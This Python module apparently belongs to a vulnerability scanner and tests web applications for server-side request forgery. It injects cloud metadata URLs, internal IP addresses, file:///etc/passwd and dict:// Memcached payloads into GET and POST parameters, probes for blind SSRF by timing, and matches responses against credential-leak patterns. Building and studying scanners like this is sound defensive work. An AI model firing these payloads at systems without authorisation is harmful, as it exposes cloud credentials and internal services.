"""
OWASP A10 — Server-Side Request Forgery (SSRF)
Real ethical-hacker-level detection:
  - Actually injects cloud metadata URLs as parameter values and checks response
  - Tests internal IP ranges (localhost, 169.254.169.254, 10.x, 172.x, 192.168.x)
  - DNS rebinding indicator detection
  - Blind SSRF via response timing difference
  - SSRF via file:// and dict:// protocol injection
  - Checks both GET params and POST body params
"""
import asyncio
import logging
import re
import time
from typing import List, Optional
from urllib.parse import urljoin, urlparse, urlencode, parse_qs, urlunparse

import httpx

from app.models.models import Severity
from app.scanner.modules.base import BaseModule, RawFinding, ScanContext

logger = logging.getLogger("vapt.scanner.a10")

SSRF_PARAM_RE = re.compile(
    r'^(url|uri|redirect|next|target|dest|destination|path|image|img|src|href|'
    r'endpoint|callback|proxy|fetch|load|open|link|forward|location|file|resource|'
    r'webhook|host|domain|site|page|feed|api|service|server|addr|address|ip|to)$',
    re.I
)

# Real SSRF payloads — cloud metadata endpoints
SSRF_PAYLOADS = [
    # AWS IMDSv1 metadata
    ("http://169.254.169.254/latest/meta-data/",         "AWS IMDSv1 metadata"),
    ("http://169.254.169.254/latest/meta-data/iam/",     "AWS IAM metadata"),
    ("http://169.254.169.254/latest/user-data",          "AWS user-data"),
    # GCP metadata
    ("http://metadata.google.internal/computeMetadata/v1/", "GCP metadata"),
    ("http://169.254.169.254/computeMetadata/v1/",       "GCP metadata alt"),
    # Azure metadata
    ("http://169.254.169.254/metadata/instance",         "Azure IMDS"),
    # Localhost
    ("http://localhost/",                                 "localhost access"),
    ("http://127.0.0.1/",                                "loopback access"),
    ("http://0.0.0.0/",                                  "0.0.0.0 loopback"),
    # Internal ranges
    ("http://192.168.1.1/",                              "internal network gateway"),
    ("http://10.0.0.1/",                                 "internal 10.x network"),
    # Protocol confusion
    ("file:///etc/passwd",                               "local file read via file://"),
    ("dict://localhost:11211/stat",                      "Memcached via dict://"),
]

# Patterns in response body that confirm SSRF exploitation
METADATA_RESPONSE_PATTERNS = [
    (re.compile(r"ami-id", re.I),              "AWS AMI ID in response"),
    (re.compile(r"instance-id", re.I),         "AWS instance ID in response"),
    (re.compile(r"iam/security-credentials",re.I), "AWS IAM credentials path"),
    (re.compile(r"local-ipv4", re.I),          "AWS local IPv4 metadata"),
    (re.compile(r"placement/region", re.I),    "AWS placement region"),
    (re.compile(r"computeMetadata", re.I),     "GCP compute metadata"),
    (re.compile(r"serviceAccounts", re.I),     "GCP service account"),
    (re.compile(r'"compute":', re.I),          "Azure compute metadata"),
    (re.compile(r"root:.*:0:0:", re.I),        "/etc/passwd content (file:// SSRF)"),
    (re.compile(r"STORED\s+\d+", re.I),        "Memcached STORED response"),
]

# Blind SSRF timing threshold (seconds)
TIMING_DIFF_THRESHOLD = 2.5


class SSRFModule(BaseModule):
    module_id      = "a10_ssrf"
    owasp_category = "A10"
    owasp_name     = "Server-Side Request Forgery"
    severity_weight = 8.0

    async def analyze(self, ctx: ScanContext, client: httpx.AsyncClient) -> List[RawFinding]:
        findings: List[RawFinding] = []

        # Find SSRF-prone parameters in URL query string
        parsed = urlparse(ctx.url)
        params = {k: v[0] for k, v in parse_qs(parsed.query).items()}

        ssrf_params = [
            (p, v) for p, v in params.items()
            if SSRF_PARAM_RE.match(p)
            or (isinstance(v, str) and (v.startswith("http") or "/" in v))
        ]

        for param, orig_value in ssrf_params:
            # 1. Active SSRF — inject real metadata payloads
            for payload, payload_desc in SSRF_PAYLOADS[:6]:
                finding = await self._test_ssrf_payload(
                    ctx, client, parsed, params, param, payload, payload_desc
                )
                if finding:
                    findings.append(finding)
                    break  # one confirmed finding per param is enough

            # 2. Blind SSRF via timing
            timing_finding = await self._test_blind_ssrf_timing(
                ctx, client, parsed, params, param, orig_value
            )
            if timing_finding:
                findings.append(timing_finding)

        # 3. Check POST body for SSRF params (form submissions, JSON APIs)
        post_finding = await self._test_post_ssrf(ctx, client)
        if post_finding:
            findings.append(post_finding)

        # 4. Passive: check if current response already contains metadata patterns
        passive = self._passive_metadata_check(ctx)
        if passive:
            findings.append(passive)

        return findings

    # ── Active SSRF Payload Injection ─────────────────────────────────────────
    async def _test_ssrf_payload(
        self,
        ctx: ScanContext,
        client: httpx.AsyncClient,
        parsed,
        params: dict,
        param: str,
        payload: str,
        payload_desc: str,
    ) -> Optional[RawFinding]:
        """Inject real SSRF payload and check if response contains metadata."""
        try:
            probe_params = {**params, param: payload}
            probe_url    = urlunparse(parsed._replace(query=urlencode(probe_params)))

            resp = await client.get(probe_url, timeout=8, follow_redirects=True)
            body = resp.text

            # Check if response contains metadata fingerprints
            for pattern, pattern_desc in METADATA_RESPONSE_PATTERNS:
                if pattern.search(body):
                    return self.build_finding(
                        title=f"SSRF Confirmed — {payload_desc} via Parameter '{param}'",
                        description=(
                            f"Parameter '{param}' at '{ctx.url}' accepted the payload "
                            f"'{payload}' and the server returned a response containing "
                            f"{pattern_desc}. The server fetched the internal/metadata "
                            f"resource and returned its content. "
                            f"An attacker can read cloud credentials, internal services, "
                            f"and sensitive infrastructure data."
                        ),
                        severity=Severity.CRITICAL,
                        url=ctx.url,
                        parameter=param,
                        evidence={
                            "detection_method": "active_ssrf_payload",
                            "ssrf_param": param,
                            "payload_injected": payload,
                            "payload_description": payload_desc,
                            "response_status": resp.status_code,
                            "response_size": len(body),
                            "metadata_pattern_matched": pattern_desc,
                            "response_snippet": body[:400],
                        },
                        remediation=(
                            "Implement a strict URL allowlist — only permit known safe domains. "
                            "Block all requests to private IP ranges (RFC-1918) and link-local addresses. "
                            "Disable unnecessary URL-fetching functionality. "
                            "Use a dedicated HTTP client with network-level egress controls. "
                            "Block metadata endpoints at the network/firewall level."
                        ),
                        references=[
                            "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery",
                            "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html",
                        ],
                        confidence=0.96,
                    )

            # Even without metadata match — if server fetched our URL and returned content
            # that doesn't match the original response — flag as probable SSRF
            orig_len  = len(ctx.response_body)
            probe_len = len(body)
            if (
                resp.status_code == 200
                and probe_len > 50
                and abs(orig_len - probe_len) > 100
                and "169.254.169.254" in payload
            ):
                return self.build_finding(
                    title=f"Probable SSRF — Metadata IP Response via Parameter '{param}'",
                    description=(
                        f"Parameter '{param}' accepted '{payload}' and the server returned "
                        f"HTTP 200 with {probe_len} bytes (original: {orig_len} bytes). "
                        f"The response difference suggests the server may have fetched "
                        f"the metadata endpoint. Manual verification recommended."
                    ),
                    severity=Severity.HIGH,
                    url=ctx.url,
                    parameter=param,
                    evidence={
                        "detection_method": "ssrf_response_size_diff",
                        "ssrf_param": param,
                        "payload_injected": payload,
                        "original_response_size": orig_len,
                        "probe_response_size": probe_len,
                        "response_status": resp.status_code,
                        "response_snippet": body[:300],
                    },
                    remediation=(
                        "Block all requests to 169.254.169.254 and RFC-1918 ranges. "
                        "Implement URL allowlisting. Disable URL-fetching if not needed."
                    ),
                    confidence=0.65,
                )

        except Exception as e:
            logger.debug(f"SSRF payload test error {ctx.url}[{param}={payload}]: {e}")

        return None

    # ── Blind SSRF via Timing ─────────────────────────────────────────────────
    async def _test_blind_ssrf_timing(
        self,
        ctx: ScanContext,
        client: httpx.AsyncClient,
        parsed,
        params: dict,
        param: str,
        orig_value: str,
    ) -> Optional[RawFinding]:
        """
        Compare response time of:
          (a) original request
          (b) request with non-routable IP (10.255.255.1) — causes TCP timeout
        A significantly slower response on (b) suggests the server is
        actually trying to connect to the injected URL (blind SSRF).
        """
        try:
            # Baseline timing
            t0 = time.time()
            await client.get(ctx.url, timeout=8)
            baseline = time.time() - t0

            # Inject non-routable internal IP — will cause connection timeout
            # if server tries to connect (blind SSRF)
            probe_params = {**params, param: "http://10.255.255.1/vapt-ssrf-probe"}
            probe_url    = urlunparse(parsed._replace(query=urlencode(probe_params)))

            t0 = time.time()
            try:
                await client.get(probe_url, timeout=8)
            except httpx.TimeoutException:
                pass  # timeout itself is evidence of blind SSRF
            probe_time = time.time() - t0

            time_diff = probe_time - baseline

            if time_diff >= TIMING_DIFF_THRESHOLD:
                return self.build_finding(
                    title=f"Blind SSRF Detected via Timing — Parameter '{param}'",
                    description=(
                        f"Injecting a non-routable IP (http://10.255.255.1/) into "
                        f"parameter '{param}' caused the server response to take "
                        f"{probe_time:.1f}s vs baseline {baseline:.1f}s "
                        f"(+{time_diff:.1f}s delay). "
                        f"This timing difference strongly suggests the server is "
                        f"attempting to connect to the injected URL (blind SSRF). "
                        f"Even without visible output, an attacker can probe internal services."
                    ),
                    severity=Severity.HIGH,
                    url=ctx.url,
                    parameter=param,
                    evidence={
                        "detection_method": "blind_ssrf_timing",
                        "ssrf_param": param,
                        "payload": "http://10.255.255.1/vapt-ssrf-probe",
                        "baseline_time_seconds": round(baseline, 2),
                        "probe_time_seconds": round(probe_time, 2),
                        "timing_diff_seconds": round(time_diff, 2),
                        "threshold_seconds": TIMING_DIFF_THRESHOLD,
                    },
                    remediation=(
                        "Block server-side requests to RFC-1918 and link-local ranges. "
                        "Implement network-level egress filtering. "
                        "Apply URL allowlisting before any HTTP fetch operations."
                    ),
                    references=[
                        "https://portswigger.net/web-security/ssrf/blind",
                    ],
                    confidence=0.72,
                )

        except Exception as e:
            logger.debug(f"Blind SSRF timing test error: {e}")

        return None

    # ── POST Body SSRF ─────────────────────────────────────────────────────────
    async def _test_post_ssrf(
        self, ctx: ScanContext, client: httpx.AsyncClient
    ) -> Optional[RawFinding]:
        """
        If page has a form or is an API endpoint, send POST with SSRF payload
        in common field names and check response.
        """
        url_lower = ctx.url.lower()
        is_candidate = any(kw in url_lower for kw in
                           ["/webhook", "/import", "/fetch", "/proxy",
                            "/preview", "/screenshot", "/pdf", "/export",
                            "/api/", "/upload"])
        if not is_candidate:
            return None

        ssrf_payload = "http://169.254.169.254/latest/meta-data/"
        test_bodies = [
            {"url": ssrf_payload},
            {"webhook_url": ssrf_payload},
            {"target": ssrf_payload},
            {"endpoint": ssrf_payload},
            {"callback": ssrf_payload},
        ]

        for body in test_bodies:
            try:
                resp = await client.post(ctx.url, json=body, timeout=8)
                response_text = resp.text

                for pattern, pattern_desc in METADATA_RESPONSE_PATTERNS:
                    if pattern.search(response_text):
                        return self.build_finding(
                            title=f"SSRF via POST Body — {pattern_desc}",
                            description=(
                                f"POST request to '{ctx.url}' with body {body} "
                                f"triggered an SSRF — the response contains {pattern_desc}. "
                                f"The server fetched the cloud metadata endpoint and returned its content."
                            ),
                            severity=Severity.CRITICAL,
                            url=ctx.url,
                            evidence={
                                "detection_method": "post_body_ssrf",
                                "post_body": body,
                                "response_status": resp.status_code,
                                "metadata_pattern": pattern_desc,
                                "response_snippet": response_text[:400],
                            },
                            remediation=(
                                "Validate and allowlist all URLs in POST body. "
                                "Block requests to metadata endpoints at network level."
                            ),
                            confidence=0.95,
                        )
            except Exception as e:
                logger.debug(f"POST SSRF test error: {e}")

        return None

    # ── Passive Metadata Check ─────────────────────────────────────────────────
    def _passive_metadata_check(self, ctx: ScanContext) -> Optional[RawFinding]:
        """Check if current response already contains metadata fingerprints."""
        body = ctx.response_body
        for pattern, pattern_desc in METADATA_RESPONSE_PATTERNS:
            if pattern.search(body):
                return self.build_finding(
                    title=f"SSRF Response Pattern in Current Page — {pattern_desc}",
                    description=(
                        f"The response at '{ctx.url}' already contains {pattern_desc}. "
                        f"This may indicate a previously exploited SSRF or "
                        f"an endpoint that returns internal metadata."
                    ),
                    severity=Severity.CRITICAL,
                    url=ctx.url,
                    evidence={
                        "detection_method": "passive_metadata_pattern",
                        "metadata_pattern": pattern_desc,
                        "response_snippet": body[:400],
                    },
                    remediation=(
                        "Investigate why internal metadata appears in this response. "
                        "Block metadata endpoint access at network level immediately."
                    ),
                    confidence=0.85,
                )
        return None
